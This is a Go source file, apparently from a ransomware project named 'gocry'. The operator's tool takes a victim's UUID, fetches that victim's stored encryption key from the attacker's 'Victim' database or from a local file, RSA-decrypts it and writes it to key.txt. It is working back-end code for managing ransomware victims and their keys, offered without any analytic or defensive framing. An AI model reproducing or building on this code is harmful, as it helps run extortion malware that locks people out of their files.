package main

import (
	"io/ioutil"
	"log"
	"os"

	"github.com/nireo/gocry/server/database"
	"github.com/nireo/gocry/server/utils"
)

func main() {
	if len(os.Args) < 3 {
		log.Fatalf("you need to provide user's id")
	}

	var key []byte
	if os.Args[2] == "database" {
		database.ConnectToDatbase()
		db := database.GetDatabase()

		var victim database.Victim
		if err := db.Where(&database.Victim{UUID: os.Args[1]}).Find(&victim).Error; err != nil {
			log.Fatal(err)
		}

		key = victim.EncryptionKey
	} else {
		fileData, err := ioutil.ReadFile("./decrypt")
		if err != nil {
			log.Fatal(err)
		}

		key = fileData
	}

	out, err := utils.DecryptRSA(os.Args[1], key)
	if err != nil {
		log.Fatal(err)
	}

	if err := ioutil.WriteFile("./key.txt", out, 0666); err != nil {
		log.Fatalf("error writing key data, err: %s", err)
	}
}
